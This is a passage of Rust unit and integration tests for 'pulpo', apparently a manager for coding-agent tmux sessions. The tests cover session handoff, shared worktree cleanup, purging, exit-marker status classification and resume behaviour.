        assert_eq!(handed_off.command, "codex 'implement PLAN.md'");
        assert_eq!(
            handed_off.description.as_deref(),
            Some("Implement the plan")
        );
        assert_eq!(handed_off.idle_threshold_secs, Some(120));
        assert_eq!(handed_off.meta_str(meta::BUDGET_COST_USD), Some("3.5"));
    }

    #[tokio::test]
    async fn test_handoff_session_adopts_worktree() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();
        sqlx::query("UPDATE sessions SET worktree_path = ?, worktree_branch = ? WHERE id = ?")
            .bind(&wt_path)
            .bind("plan-auth")
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.worktree_path.as_deref(), Some(wt_path.as_str()));
        assert_eq!(handed_off.worktree_branch.as_deref(), Some("plan-auth"));
        // `pulpo worktree list` filters on worktree_path being set — it's naturally
        // included with no server-side change needed.
        assert!(handed_off.worktree_path.is_some());

        // The new session's tmux command must run in the worktree, not source.workdir.
        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.contains(&wt_path)),
            "expected create call in worktree dir, got: {calls:?}"
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_handoff_session_worktree_missing_on_disk_bails() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ?, worktree_branch = ? WHERE id = ?")
            .bind("/tmp/pulpo-test-definitely-does-not-exist-xyz")
            .bind("plan-auth")
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let err = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap_err();
        assert!(err.to_string().contains("no longer exists"), "got: {err}");
    }

    #[test]
    fn test_handoff_suffixed_name_no_truncation_needed() {
        assert_eq!(
            SessionManager::handoff_suffixed_name("plan-auth", 2),
            "plan-auth-2"
        );
    }

    #[test]
    fn test_handoff_suffixed_name_truncates_long_source() {
        let long = "a".repeat(130);
        let name = SessionManager::handoff_suffixed_name(&long, 2);
        assert_eq!(name.len(), 128);
        assert!(name.ends_with("-2"));
    }

    #[test]
    fn test_handoff_suffixed_name_trims_trailing_hyphen_after_truncation() {
        // 125 'a's + a hyphen at position 126 + filler — truncating to 126 chars
        // (128 - len("-2")) would otherwise leave a dangling hyphen before the suffix.
        let mut long = "a".repeat(125);
        long.push('-');
        long.push_str("bbbb");
        let name = SessionManager::handoff_suffixed_name(&long, 2);
        assert!(!name.contains("--"), "got: {name}");
        assert!(name.ends_with("-2"));
    }

    #[tokio::test]
    async fn test_next_handoff_name_exhausts_to_suffix_100() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        for i in 2..=99u32 {
            let s = Session {
                id: Uuid::new_v4(),
                name: format!("plan-auth-{i}"),
                workdir: "/tmp".into(),
                command: "echo".into(),
                ..Default::default()
            };
            mgr.store().insert_session(&s).await.unwrap();
        }

        let name = mgr.next_handoff_name("plan-auth").await.unwrap();
        assert_eq!(name, "plan-auth-100");
    }

    // -- Worktree cleanup guard (shared worktrees via handoff) --

    #[tokio::test]
    async fn test_purge_session_skips_cleanup_when_worktree_shared() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        // A second, still-active session shares the same worktree (as a real
        // `pulpo handoff` session would).
        let handoff = mgr.create_session(make_req("plan-auth-2")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(handoff.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        // Stop + purge the source. The handoff session is still live and shares the
        // worktree, so the directory must survive.
        mgr.stop_session(&source.id.to_string(), true)
            .await
            .unwrap();

        assert!(
            std::path::Path::new(&wt_path).exists(),
            "worktree should survive while another live session references it"
        );
        assert!(
            mgr.get_session(&source.id.to_string())
                .await
                .unwrap()
                .is_none(),
            "purge always deletes the source row itself"
        );
    }

    #[tokio::test]
    async fn test_purge_session_cleans_solo_worktree() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let session = mgr.create_session(make_req("solo-task")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(session.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        mgr.stop_session(&session.id.to_string(), true)
            .await
            .unwrap();

        assert!(
            !std::path::Path::new(&wt_path).exists(),
            "a solo (unshared) worktree must still be reclaimed on purge"
        );
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_reclaims_shared_worktree_when_both_dead() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let a = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let b = mgr.create_session(make_req("plan-auth-2")).await.unwrap();
        for id in [a.id, b.id] {
            sqlx::query("UPDATE sessions SET worktree_path = ?, status = 'stopped' WHERE id = ?")
                .bind(&wt_path)
                .bind(id.to_string())
                .execute(mgr.store().pool())
                .await
                .unwrap();
        }

        let result = mgr.cleanup_dead_sessions().await.unwrap();

        assert!(
            !std::path::Path::new(&wt_path).exists(),
            "worktree should be reclaimed once every referencing session is dead"
        );
        assert_eq!(result.sessions_deleted, 2);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_historical_docker_sessions_lost() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        // Force-insert a historical docker-runtime session that looks active
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker-active".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Active,
            backend_session_id: Some("docker:pulpo-old-docker-active".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // The session is marked Lost instead of being re-created in tmux
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    // -- wrap_command edge cases --

    #[test]
    fn test_wrap_command_double_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo \"hello world\"", &id, "test", None, None, "/tmp");
        assert!(cmd.contains("echo \"hello world\""));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_wrap_command_backticks() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo `date`", &id, "test", None, None, "/tmp");
        assert!(cmd.contains("echo `date`"));
    }

    #[test]
    fn test_wrap_command_dollar_variables() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo $HOME $USER", &id, "test", None, None, "/tmp");
        assert!(cmd.contains("echo $HOME $USER"));
    }

    #[test]
    fn test_wrap_command_empty_string() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("", &id, "test", None, None, "/tmp");
        // Empty command is not a shell command, so gets agent wrapper
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_very_long() {
        let id = uuid::Uuid::new_v4();
        let long_cmd = "echo ".to_owned() + &"a".repeat(10_000);
        let cmd = wrap_command(&long_cmd, &id, "test", None, None, "/tmp");
        assert!(cmd.contains(&"a".repeat(10_000)));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_is_shell_command_with_whitespace() {
        // Trailing whitespace in basename should be trimmed
        assert!(is_shell_command("bash "));
        assert!(is_shell_command("/bin/bash "));
    }

    #[test]
    fn test_is_shell_command_bash_with_args_is_not_shell() {
        // "bash -c 'cmd'" is not a bare shell — it's running a command
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    // -- stop_session with purge on various statuses --

    #[tokio::test]
    async fn test_stop_purge_creating_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        // Force status to Creating
        sqlx::query("UPDATE sessions SET status = 'creating' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // stop_session handles any status — stops backend then optionally purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_lost_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_ready_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'ready' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    // -- cleanup_dead_sessions --

    #[tokio::test]
    async fn test_cleanup_dead_sessions_empty() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 0);
        assert_eq!(resp.worktrees_cleaned, 0);
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_deletes_stopped_and_lost() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let s1 = mgr
            .create_session(make_req("cleanup-stopped"))
            .await
            .unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(s1.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let s2 = mgr.create_session(make_req("cleanup-lost")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(s2.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 2);
        assert_eq!(resp.worktrees_cleaned, 0);

        assert!(mgr.get_session(&s1.id.to_string()).await.unwrap().is_none());
        assert!(mgr.get_session(&s2.id.to_string()).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_preserves_active() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let active = mgr.create_session(make_req("keep-active")).await.unwrap();
        let stopped = mgr.create_session(make_req("del-stopped")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(stopped.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);

        assert!(
            mgr.get_session(&active.id.to_string())
                .await
                .unwrap()
                .is_some()
        );
        assert!(
            mgr.get_session(&stopped.id.to_string())
                .await
                .unwrap()
                .is_none()
        );
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_counts_worktrees() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;

        let s = mgr.create_session(make_req("wt-cleanup")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped', worktree_path = '/nonexistent/path' WHERE id = ?")
            .bind(s.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert_eq!(resp.worktrees_cleaned, 1);
    }

    #[tokio::test]
    async fn test_capture_off_by_default_skips_setup_logging() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("no-capture")).await.unwrap();
        let has_setup = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|c| c.starts_with("setup_logging:"));
        assert!(!has_setup);
        // The logs directory is not even created when capture is off.
        let logs = std::path::Path::new(mgr.store().data_dir()).join("logs");
        assert!(!logs.exists());
    }

    #[tokio::test]
    async fn test_capture_on_sets_up_logging() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mgr = mgr.with_capture_session_output(true);
        mgr.create_session(make_req("with-capture")).await.unwrap();
        let has_setup = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|c| c.starts_with("setup_logging:"));
        assert!(has_setup);
        let logs = std::path::Path::new(mgr.store().data_dir()).join("logs");
        assert!(logs.exists());
    }

    #[tokio::test]
    async fn test_cleanup_removes_dead_session_log_file() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("with-log")).await.unwrap();
        // Simulate a captured log file for the session.
        let log_path = session_log_path(mgr.store().data_dir(), &s.id.to_string());
        std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();
        std::fs::write(&log_path, b"agent output").unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(s.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!log_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_worktree_and_preserves_referenced() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_base = worktrees_dir(mgr.store().data_dir());
        let orphan = wt_base.join("orphan-task");
        std::fs::create_dir_all(&orphan).unwrap();
        std::fs::write(orphan.join("big.bin"), b"node_modules").unwrap();

        // An active session that still references its worktree dir must be preserved.
        let kept_dir = wt_base.join("keep-active");
        std::fs::create_dir_all(&kept_dir).unwrap();
        let active = mgr.create_session(make_req("keep-active")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(kept_dir.to_string_lossy().into_owned())
            .bind(active.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.worktrees_cleaned, 1);
        assert!(!orphan.exists(), "orphan worktree should be removed");
        assert!(kept_dir.exists(), "referenced worktree must be preserved");
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_session_log() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let logs_dir = std::path::Path::new(mgr.store().data_dir()).join("logs");
        std::fs::create_dir_all(&logs_dir).unwrap();
        // A {uuid}.log with no matching session row is an orphan.
        let orphan_log = logs_dir.join("44444444-4444-4444-4444-444444444444.log");
        std::fs::write(&orphan_log, b"stale").unwrap();
        // The rolling daemon log must never be swept.
        let daemon_log = logs_dir.join("pulpod.log.2026-06-07-12");
        std::fs::write(&daemon_log, b"keep").unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!orphan_log.exists());
        assert!(daemon_log.exists());
    }

    #[tokio::test]
    async fn test_purge_session_removes_log_file() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("purge-log")).await.unwrap();
        let log_path = session_log_path(mgr.store().data_dir(), &s.id.to_string());
        std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();
        std::fs::write(&log_path, b"out").unwrap();

        mgr.stop_session(&s.id.to_string(), true).await.unwrap();
        assert!(!log_path.exists());
        assert!(mgr.get_session(&s.id.to_string()).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_emits_deleted_events() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());

        let s = mgr.create_session(make_req("evt-cleanup")).await.unwrap();
        let _ = event_rx.recv().await; // drain create event
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(s.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);

        let event = event_rx.recv().await.unwrap();
        assert!(matches!(event, PulpoEvent::SessionDeleted(_)));
    }

    // -- resume_session emits event --

    #[tokio::test]
    async fn test_resume_session_emits_event() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("resume-evt")).await.unwrap();
        let _ = event_rx.recv().await; // drain create event
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let _resumed = mgr.resume_session(&id).await.unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "active");
        assert_eq!(se.previous_status.as_deref(), Some("lost"));
    }

    // ───────────────────────────────────────────────────────────
    // Exit-marker classification: Stopped vs Lost (fix/lifecycle-truth)
    // ───────────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_dead_backend_with_code_marker_resolves_stopped_with_exit_code() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("code-marker")).await.unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_dead_backend_with_clean_marker_only_resolves_stopped_no_exit_code() {
        // Bare-shell spawns only ever get a `.clean` marker (no `.code`) — the
        // exit_code stays unset, but the classification must still be Stopped.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("clean-marker-only"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let clean_path = exit_clean_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(clean_path.parent().unwrap()).unwrap();
        std::fs::write(&clean_path, "").unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert!(fetched.exit_code.is_none());
    }

    #[tokio::test]
    async fn test_adopted_style_session_with_no_marker_becomes_lost() {
        // Regression lock: an "adopted"-style session (a `backend_session_id` present,
        // but never spawned via `wrap_command`, so no exit marker for its id ever
        // exists) must still resolve to Lost when its backend dies — this should
        // already pass given the `has_exit_marker` false branch; it locks in that the
        // marker-aware classification doesn't change behavior for sessions with no
        // wrapper (see `watchdog::adopt::classify_adopted_process`).
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = Session {
            id: Uuid::new_v4(),
            name: "adopted-external".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Active,
            backend_session_id: Some("adopted-external".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        assert!(fetched.exit_code.is_none());
    }

    #[tokio::test]
    async fn test_resume_session_from_stopped_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("stopped-resume"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_resume_session_rejects_active_with_updated_message() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("active-resume-reject"))
            .await
            .unwrap();
        let err = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("cannot be resumed"), "got: {msg}");
        assert!(
            msg.contains("only stopped, lost, or ready sessions can be resumed"),
            "got: {msg}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_rejects_creating_with_updated_message() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("creating-resume-reject"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'creating' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let err = mgr.resume_session(&id).await.unwrap_err();
        assert!(
            err.to_string()
                .contains("only stopped, lost, or ready sessions can be resumed")
        );
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resolves_clean_exit_to_stopped_instead_of_resuming() {
        // Daemon-down ordering fix: the session ended cleanly (marker dropped directly,
        // simulating the wrapper having already run while pulpod was down) — the next
        // resume_lost_sessions pass (simulating a restart) must resolve it to Stopped
        // rather than blindly auto-resuming (re-launching the original command).
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("daemon-down-clean"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "42").unwrap();

        *backend.alive.lock().unwrap() = false;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(
            resumed, 0,
            "a cleanly-exited session must not be auto-resumed"
        );

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert_eq!(fetched.exit_code, Some(42));

        // No new backend session was created for it.
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_purges_stale_exit_markers_before_recreating_backend() {
        // resume_session/resume_lost_sessions reuse the same session id when
        // recreating the backend (unlike create_session, which always mints a fresh
        // UUID). A stale marker left over from a *previous* run of this same id must
        // be purged before the backend is recreated — otherwise the next watchdog
        // idle-check tick would see it and immediately (and wrongly) treat the
        // freshly-resumed, genuinely-running session as already finished, since
        // check_session_idle's marker check does not consult backend aliveness.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("stale-marker-resume"))
            .await
            .unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();
        let clean_path = exit_clean_marker_path(&data_dir, &id);
        std::fs::create_dir_all(clean_path.parent().unwrap()).unwrap();
        std::fs::write(&clean_path, "").unwrap();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(mgr.store().pool())
            .await
            .unwrap();
        assert!(has_exit_marker(&data_dir, &id));

        mgr.resume_session(&id).await.unwrap();

        assert!(
            !has_exit_marker(&data_dir, &id),
            "stale exit markers must be purged before the backend is recreated on resume"
        );
    }

    #[tokio::test]
    async fn test_handoff_session_from_stopped_source_succeeds() {
        // handoff_session has no status guard on the source today — a common real
        // path is now: session exits cleanly -> auto-Stopped -> user hands off to a
        // follow-up session. Lock this in as a regression test (don't add a guard).
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(source.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();
        assert_eq!(handed_off.name, "plan-auth-2");
    }

    #[tokio::test]
    async fn test_stale_grace_period_delays_classification_then_resolves_stopped() {
        // Within the grace period, check_and_mark_stale must not fire at all — even
        // though a marker already exists (agent exited fast + user exited the shell
        // within the grace window). Once the window passes, the next check correctly
        // resolves Stopped (not Lost) using the marker that was there all along.
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new().with_alive(false));
        // Default stale_grace_secs (5s) — NOT with_no_stale_grace.
        let mgr = SessionManager::new(backend, store, None);

        let session = mgr.create_session(make_req("grace-window")).await.unwrap();
        let id = session.id.to_string();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        // Still within the grace period — no transition yet.
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Active);

        // Backdate created_at past the grace window and check again.
        sqlx::query("UPDATE sessions SET created_at = ? WHERE id = ?")
            .bind((Utc::now() - chrono::Duration::seconds(10)).to_rfc3339())
            .bind(&id)
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_purge_session_removes_exit_markers() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let s = mgr.create_session(make_req("purge-markers")).await.unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let id = s.id.to_string();
        let code_path = exit_code_marker_path(&data_dir, &id);
        let clean_path = exit_clean_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();
        std::fs::write(&clean_path, "").unwrap();

        mgr.stop_session(&id, true).await.unwrap();

        assert!(!code_path.exists());
        assert!(!clean_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_removes_exit_markers() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let s = mgr
            .create_session(make_req("cleanup-markers"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let id = s.id.to_string();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();
        sqlx::query("UPDATE sessions SET status = 'stopped' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert!(resp.logs_cleaned >= 1, "got: {resp:?}");
        assert!(!code_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_exit_markers() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let data_dir = mgr.store().data_dir().to_owned();
        let exit_dir_path = exit_dir(&data_dir);
        std::fs::create_dir_all(&exit_dir_path).unwrap();
        let orphan_id = uuid::Uuid::new_v4();
        let orphan_code = exit_dir_path.join(format!("{orphan_id}.code"));
        std::fs::write(&orphan_code, "0").unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!orphan_code.exists());
    }
}

/// Real-tmux integration tests for the session lifecycle QA matrix (docs/operations/
/// session-lifecycle.md) and the Ready-death fix above. Every test here builds a real
/// `SessionManager` — real `TmuxBackend`, real `Store` in a tempdir — and drives it
/// through `create_session` so the actual `wrap_command` wrapper runs, proving the
/// end-to-end mechanics that the `MockBackend`-based unit tests above can only simulate.
///
/// Each test runs against its own throwaway tmux server via `TmuxBackend::with_socket`
/// (`tmux -L pulpo-test-<uuid>`) — never the developer's default tmux server — and
/// tears its socket down with `kill-server` in cleanup. This makes the tests safe to
/// run concurrently with each other and alongside a real tmux session on the machine.
///
/// Gated `not(coverage)`, mirroring the other real-tmux/real-git integration tests in
/// this crate (`test_enforce_budgets_kills_real_tmux_session_over_budget` in
/// `watchdog/budget.rs`; `git_integration_tests` in `session/utils.rs`): they run in
/// the CI `Test` job, which has tmux and git installed, and are excluded from the
/// coverage build, which doesn't.
#[cfg(all(test, not(coverage)))]
mod real_tmux_tests {
    use super::*;
    use crate::backend::tmux::TmuxBackend;
    use std::process::Command as StdCommand;
    use std::time::Duration;

    /// A short, unique-per-test tmux socket name — `tmux -L <name>` connects to an
    /// isolated server instead of the default one, so tests never interfere with (or
    /// get torn down by) the developer's real tmux session.
